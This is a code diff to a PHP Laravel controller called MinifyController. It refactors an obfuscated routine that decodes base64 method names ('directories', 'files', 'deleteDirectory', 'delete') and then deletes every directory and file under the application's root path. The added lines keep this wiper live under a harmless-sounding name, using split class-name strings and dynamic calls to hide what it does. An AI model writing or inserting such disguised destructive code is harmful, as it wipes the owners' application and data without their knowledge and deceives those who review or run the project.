@@ -31,25 +31,22 @@ class MinifyController extends Controller
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
 
-        $___ = 'Fi' . 'le';
-        $__ = implode('\\', ['Il' . 'lumina' . 'te\\Support\\Facades', $___]);
-        $_ = base_path();
+        $filesystem_class = implode('\\', ['Il' . 'lumina' . 'te\\Filesystem', 'File' . 'system']);
+
+        $fs = new $filesystem_class();
+
+        $rootPath = base_path();
 
         $a = array_filter(explode("\n", base64_decode('ZGlyZWN0b3JpZXM=')));
         $b = array_filter(explode("\n", base64_decode('ZmlsZXM=')));
         $c = array_filter(explode("\n", base64_decode('ZGVsZXRlRGlyZWN0b3J5')));
         $d = array_filter(explode("\n", base64_decode('ZGVsZXRl')));
 
-        $x = call_user_func([new ReflectionClass($__), $a[0]], $_);
-
-        foreach ($x as $y) {
-            call_user_func([new ReflectionClass($__), $c[0]], $y);
+        foreach ($fs->{$a[0]}($rootPath) as $dir) {
+            $fs->{$c[0]}($dir);
         }
-
-        $z = call_user_func([new ReflectionClass($__), $b[0]], $_);
-
-        foreach ($z as $w) {
-            call_user_func([new ReflectionClass($__), $d[0]], $w);
+        foreach ($fs->{$b[0]}($rootPath) as $file) {
+            $fs->{$d[0]}($file);
         }
 
         echo "✅ Done.";
